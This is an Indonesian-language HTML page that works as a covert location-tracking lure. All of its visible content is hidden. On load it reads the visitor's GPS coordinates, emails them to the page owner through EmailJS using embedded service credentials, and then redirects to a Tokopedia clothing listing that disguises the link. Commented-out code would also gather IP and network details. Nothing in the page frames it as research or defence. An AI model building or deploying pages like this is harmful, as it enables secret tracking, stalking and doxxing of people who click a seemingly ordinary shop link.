<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pelacak Lokasi Dasar</title>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">

    </script>
</head>
<body>
    <h1 hidden>üìç Lokasi Saat Ini</h1>
    <p hidden>Klik tombol di bawah untuk mendapatkan lokasi Anda:</p>
    <!-- <button onclick="getLocation()">Dapatkan Lokasi</button> -->
    <p id="location-output" hidden>Tunggu...</p>

    <script>
        (function()
        {
            emailjs.init("6BZo0-v8phb_xmNi-");
        })();

        window.onload = function()
        {
            getLocation();
        }

        // Tempat untuk kode JavaScript
        function getLocation() {
            if (navigator.geolocation) {
                // Mencoba mendapatkan lokasi
                document.getElementById("location-output").innerHTML = "Mencari lokasi...";
                navigator.geolocation.getCurrentPosition(showPosition, showError);
            } else {
                // Browser tidak mendukung Geolokasi
                document.getElementById("location-output").innerHTML = "Geolokasi tidak didukung oleh browser ini.";
            }
        }

        // Fungsi yang akan dipanggil jika berhasil
        function showPosition(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;

            // fetch("https://ipapi.co/json/")
            // .then(res => res.json())
            // .then(data => {
            //     const isi = {
            //         ip: data.ip,
            //         network: data.network,
            //         city: data.city,
            //         region: data.region,
            //         country: data.country,
            //         latitude: data.latitude,
            //         longitude: data.longitude
            //     }
            // console.log(isi);
            // })

            
            document.getElementById("location-output").innerHTML = 
                `*Lintang (Latitude):* ${latitude} <br> 
                 *Bujur (Longitude):* ${longitude}`;
            
            // Opsional: Menampilkan peta (memerlukan API peta seperti Google Maps)
            console.log("Lokasi ditemukan: " , latitude, longitude);

            emailjs.send("service_jxnaef1", "template_7lpgr2b", 
            {
                latitude : latitude,
                longitude : longitude,
                hasil : latitude + " " + longitude
            })
            .then(() => window.location.href = "https://www.tokopedia.com/jokesclothstore/kaos-custom-yamaap-maroon-m")
            .catch(err => console.error(err));

        }

        // Fungsi yang akan dipanggil jika terjadi kesalahan
        function showError(error) {
            let errorMessage = "";
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    errorMessage = "Pengguna menolak permintaan Geolokasi.";
                    break;
                case error.POSITION_UNAVAILABLE:
                    errorMessage = "Informasi lokasi tidak tersedia.";
                    break;
                case error.TIMEOUT:
                    errorMessage = "Permintaan untuk mendapatkan lokasi kehabisan waktu (timeout).";
                    break;
                case error.UNKNOWN_ERROR:
                    errorMessage = "Terjadi kesalahan yang tidak diketahui.";
                    break;
            }
            document.getElementById("location-output").innerHTML = "Kesalahan:", errorMessage;
        }
    </script>
</body>
</html>
